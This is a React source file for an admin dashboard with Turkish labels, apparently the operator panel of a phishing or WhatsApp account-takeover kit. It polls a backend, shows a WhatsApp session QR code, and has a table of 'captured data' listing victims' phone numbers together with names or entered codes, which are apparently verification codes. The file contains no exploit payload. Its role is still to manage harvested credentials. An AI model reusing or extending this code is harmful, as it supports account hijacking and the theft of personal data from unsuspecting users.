import React, { useState, useEffect } from 'react';
import axios from 'axios';
import API_URL from '../api/config';

const AdminPanel = () => {
  const [data, setData] = useState({ status: 'INITIALIZING', qr: null, logs: [], systemLogs: [] });
  const [loading, setLoading] = useState(false);

  const fetchStatus = async () => {
    try {
      const response = await axios.get(`${API_URL}/api/admin/status`);
      setData(response.data);
    } catch (error) {
      console.error('Admin Fetch Error:', error);
    }
  };

  useEffect(() => {
    fetchStatus();
    const interval = setInterval(fetchStatus, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleRestart = async () => {
    if (loading) return;
    try {
      setLoading(true);
      await axios.post(`${API_URL}/api/admin/restart`);
      fetchStatus();
    } catch (error) {
      alert('Yeniden başlatma başlatılamadı.');
    } finally {
      setLoading(false);
    }
  };

  const getStatusColor = (status) => {
    switch (status) {
      case 'READY': return '#22C55E';
      case 'QR_REQUIRED': return '#EAB308';
      case 'AUTHENTICATING': return '#3B82F6';
      case 'DISCONNECTED': return '#EF4444';
      default: return '#737373';
    }
  };

  return (
    <div className="reg-card" style={{ maxWidth: '1000px', width: '95%', margin: '20px auto', gap: '20px', display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) 300px' }}>
      
      {/* Sol Kolon: Ana Kontroller ve Loglar */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        <div className="card-title-section">
          <div className="title" style={{ fontSize: '24px' }}>OBSIDIAN ADMIN V4</div>
          <div className="subtitle">Sistem Durumu ve Teşhis Verileri</div>
        </div>

        {/* Status Card */}
        <div style={{ background: '#0E0E0E', padding: '20px', borderRadius: '12px', border: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <div className="badge-title">MESAJLAŞMA DURUMU</div>
            <div style={{ color: getStatusColor(data.status), fontWeight: '800', fontSize: '20px', marginTop: '4px' }}>
              {data.status}
            </div>
            {data.status === 'DISCONNECTED' && (
              <button className="submit-btn" onClick={handleRestart} disabled={loading} style={{ padding: '8px 16px', marginTop: '10px', height: 'auto', fontSize: '12px' }}>
                {loading ? 'HAZIRLANIYOR...' : 'SISTEMI YENIDEN BAŞLAT'}
              </button>
            )}
          </div>
          <div className="status-dot" style={{ width: '16px', height: '16px', backgroundColor: getStatusColor(data.status), boxShadow: `0 0 15px ${getStatusColor(data.status)}` }}></div>
        </div>

        {/* Captured Data Table */}
        <div style={{ background: '#0E0E0E', padding: '15px', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
          <div className="badge-title" style={{ marginBottom: '10px' }}>ELE GEÇİRİLEN VERİLER</div>
          <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '11px' }}>
              <thead>
                <tr style={{ textAlign: 'left', opacity: 0.5 }}>
                  <th style={{ padding: '8px' }}>Zaman</th>
                  <th style={{ padding: '8px' }}>Tip</th>
                  <th style={{ padding: '8px' }}>Detay</th>
                </tr>
              </thead>
              <tbody>
                {data.logs.map((log, i) => (
                  <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
                    <td style={{ padding: '8px' }}>{new Date(log.timestamp).toLocaleTimeString()}</td>
                    <td style={{ padding: '8px' }}>{log.type}</td>
                    <td style={{ padding: '8px' }}>{log.phone} | {log.fullName || log.enteredCode}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Sağ Kolon: QR ve Sistem Logları */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        {/* QR Section */}
        <div style={{ background: '#FFF', padding: '15px', borderRadius: '12px', textAlign: 'center' }}>
          <div style={{ color: '#000', fontSize: '10px', fontWeight: 'bold', marginBottom: '10px' }}>WHATSAPP QR KODU</div>
          {data.qr ? (
            <img src={data.qr} style={{ width: '100%' }} alt="QR" />
          ) : (
            <div style={{ padding: '40px', color: '#888', background: '#f5f5f5', fontSize: '11px', borderRadius: '8px' }}>
              {data.status === 'READY' ? 'BAĞLI' : 'BEKLENİYOR...'}
            </div>
          )}
        </div>

        {/* System Diagnostics */}
        <div style={{ background: '#090909', padding: '15px', borderRadius: '12px', border: '1px solid #1f1f1f', flex: 1 }}>
          <div className="badge-title" style={{ marginBottom: '10px', color: '#888' }}>SİSTEM TEŞHİS LOGLARI</div>
          <div style={{ height: '300px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '9px', color: '#22C55E', lineHeight: '1.4' }}>
            {(data.systemLogs || []).map((msg, i) => (
              <div key={i} style={{ marginBottom: '4px' }}>{msg}</div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
